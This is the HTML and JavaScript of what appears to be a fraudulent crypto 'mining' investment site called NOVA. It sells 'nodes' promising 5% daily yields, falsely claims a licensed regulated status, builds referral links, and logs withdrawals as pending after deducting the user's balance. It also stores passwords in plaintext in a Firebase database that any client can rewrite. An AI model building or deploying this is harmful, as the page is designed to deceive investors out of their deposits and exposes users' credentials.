<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Elite Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --gold: #D4AF37; --bg: #050505; }
        body { background: var(--bg); color: white; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; }
        .app-card { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 20px; overflow: hidden; transition: 0.3s; }
        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(10, 10, 10, 0.95); backdrop-filter: blur(20px); border-top: 1px solid #1a1a1a; display: flex; justify-content: space-around; padding: 12px; z-index: 1000; }
        .nav-item { color: #444; font-size: 10px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .nav-item.active { color: var(--gold); }
        .screen { display: none; padding-bottom: 100px; }
        .active-screen { display: block; animation: fadeIn 0.4s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .modal { display: none; position: fixed; inset: 0; background: black; z-index: 2000; padding: 20px; overflow-y: auto; }
        .nova-input { background: #0c0c0c; border: 1px solid #1a1a1a; width: 100%; padding: 15px; border-radius: 15px; color: white; font-size: 13px; outline: none; }
        .node-img { height: 80px; width: 100%; object-fit: cover; opacity: 0.5; }
    </style>
</head>
<body>

    <div id="auth-screen" class="min-h-screen flex flex-col items-center justify-center p-8 active-screen">
        <h1 class="text-5xl font-black mb-10 tracking-tighter">NOVA<span class="text-[#D4AF37]">.</span></h1>
        <div class="app-card p-6 w-full max-w-sm">
            <input type="text" id="u-email" placeholder="Terminal ID" class="nova-input mb-4">
            <input type="password" id="u-pass" placeholder="Passkey" class="nova-input mb-6">
            <button onclick="auth()" class="w-full bg-[#D4AF37] text-black py-4 rounded-xl font-black text-xs">LOGIN SYSTEM</button>
            <p onclick="toggleM()" id="m-text" class="text-center text-[10px] mt-6 text-gray-500 font-bold cursor-pointer uppercase">Create New Account</p>
        </div>
    </div>

    <div id="app" class="hidden">
        <div id="dash-screen" class="screen active-screen p-6">
            <div class="app-card p-8 mb-6 text-center border-[#D4AF37]/20">
                <p class="text-[9px] text-gray-500 font-bold tracking-widest mb-2 uppercase">Current Liquidity</p>
                <h1 id="main-bal" class="text-4xl font-black mb-4">$0.00</h1>
                <p id="v-daily" class="text-green-500 text-[10px] font-black">Daily Yield: +$0.00</p>
            </div>
            
            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="openModal('dep-modal')" class="app-card p-4 text-xs font-black text-green-500 border-green-500/10">DEPOSIT</button>
                <button onclick="openModal('wd-modal')" class="app-card p-4 text-xs font-black text-red-500 border-red-500/10">WITHDRAW</button>
            </div>

            <h3 class="text-[10px] font-black text-gray-600 mb-4 uppercase">Recent Activity</h3>
            <div id="hist-mini" class="space-y-2"></div>
        </div>

        <div id="mine-screen" class="screen p-6">
            <h2 class="text-xl font-black mb-6 gold-text uppercase">Mining Farm</h2>
            <div id="nodes-container" class="space-y-4"></div>
        </div>

        <div id="office-screen" class="screen p-6">
            <h2 class="text-xl font-black mb-6 uppercase">Institutional Info</h2>
            <div class="app-card p-6 mb-4">
                <p class="text-xs font-bold mb-2">Legal Status: <span class="text-green-500">MSB LICENSED</span></p>
                <p class="text-[10px] text-gray-500">Nova is a regulated liquidity provider. License: 31000214859621.</p>
            </div>
            <p id="ref-link" class="text-[8px] bg-black p-4 rounded-xl border border-white/5 break-all font-mono text-gray-400"></p>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('dash-screen')" class="nav-item active"><i class="fa-solid fa-wallet text-lg"></i><span>HOME</span></div>
            <div onclick="nav('mine-screen')" class="nav-item"><i class="fa-solid fa-server text-lg"></i><span>MINING</span></div>
            <div onclick="nav('office-screen')" class="nav-item"><i class="fa-solid fa-building text-lg"></i><span>LEGAL</span></div>
        </nav>
    </div>

    <div id="dep-modal" class="modal">
        <h2 class="text-2xl font-black mb-6 uppercase">Deposit Assets</h2>
        <input type="number" id="dep-amt" placeholder="Amount ($)" class="nova-input mb-4">
        <input type="text" id="dep-tid" placeholder="Transaction TXID" class="nova-input mb-4">
        <button onclick="requestFin('Deposit')" class="w-full bg-[#D4AF37] text-black py-4 rounded-xl font-black text-xs">CONFIRM DEPOSIT</button>
        <button onclick="closeModal('dep-modal')" class="w-full text-gray-500 mt-4 text-[10px] font-bold">CANCEL</button>
    </div>

    <div id="wd-modal" class="modal">
        <h2 class="text-2xl font-black mb-6 text-red-500 uppercase">Withdraw</h2>
        <input type="number" id="wd-amt" placeholder="Amount ($)" class="nova-input mb-4">
        <input type="text" id="wd-addr" placeholder="Wallet Address" class="nova-input mb-4">
        <button onclick="requestFin('Withdrawal')" class="w-full bg-white text-black py-4 rounded-xl font-black text-xs">SEND REQUEST</button>
        <button onclick="closeModal('wd-modal')" class="w-full text-gray-500 mt-4 text-[10px] font-bold">CANCEL</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);
        let activeUser = null; let isLogin = true;

        window.onload = () => {
            const saved = localStorage.getItem('nova_user');
            if(saved) start(saved);
            renderNodes();
        };

        window.toggleM = () => { isLogin = !isLogin; document.getElementById('m-text').innerText = isLogin ? "Create New Account" : "Back to Login"; };

        window.auth = async () => {
            const id = document.getElementById('u-email').value.toLowerCase().trim();
            const pw = document.getElementById('u-pass').value;
            const uRef = doc(db, "users", id); const snap = await getDoc(uRef);
            if(!isLogin) {
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, time: Date.now() });
                localStorage.setItem('nova_user', id); start(id);
            } else if(snap.exists() && snap.data().password === pw) {
                localStorage.setItem('nova_user', id); start(id);
            } else alert("Error!");
        };

        function start(id) {
            activeUser = id; document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            onSnapshot(doc(db, "users", id), d => {
                document.getElementById('main-bal').innerText = "$" + (d.data().balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "Daily Yield: +$" + (d.data().daily || 0).toFixed(2);
            });
            document.getElementById('ref-link').innerText = window.location.origin + "?ref=" + id;
        }

        function renderNodes() {
            const container = document.getElementById('nodes-container');
            for(let i=1; i<=20; i++) {
                let price = i * 15 + (i > 5 ? i*200 : 0);
                let yieldVal = (price * 0.05).toFixed(2);
                container.innerHTML += `
                    <div class="app-card flex items-center p-4 gap-4">
                        <img src="https://picsum.photos/200/200?random=${i}" class="w-12 h-12 rounded-xl object-cover">
                        <div class="flex-1">
                            <p class="text-[10px] font-black uppercase">Node Alpha-${i}</p>
                            <p class="text-sm font-black text-[#D4AF37]">$${price}</p>
                        </div>
                        <button onclick="buyNode(${price}, ${yieldVal})" class="bg-white text-black px-4 py-2 rounded-lg text-[9px] font-black">BUY</button>
                    </div>`;
            }
        }

        window.buyNode = async (p, d) => {
            const r = doc(db, "users", activeUser); const s = await getDoc(r);
            if(s.data().balance < p) return alert("Low Balance!");
            await updateDoc(r, { balance: s.data().balance - p, daily: (s.data().daily || 0) + d });
            alert("Machine Activated!");
        };

        window.requestFin = async (type) => {
            const amt = parseFloat(document.getElementById(type === 'Deposit' ? 'dep-amt' : 'wd-amt').value);
            const uRef = doc(db, "users", activeUser); const s = await getDoc(uRef);
            if(type === 'Withdrawal' && s.data().balance < amt) return alert("Low Balance!");
            
            await addDoc(collection(db, "logs"), { user: activeUser, amount: amt, type, status: 'Pending', time: Date.now() });
            if(type === 'Withdrawal') await updateDoc(uRef, { balance: s.data().balance - amt });
            alert("Request Sent!"); closeModal(type === 'Deposit' ? 'dep-modal' : 'wd-modal');
        };

        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
        };
    </script>
</body>
</html>
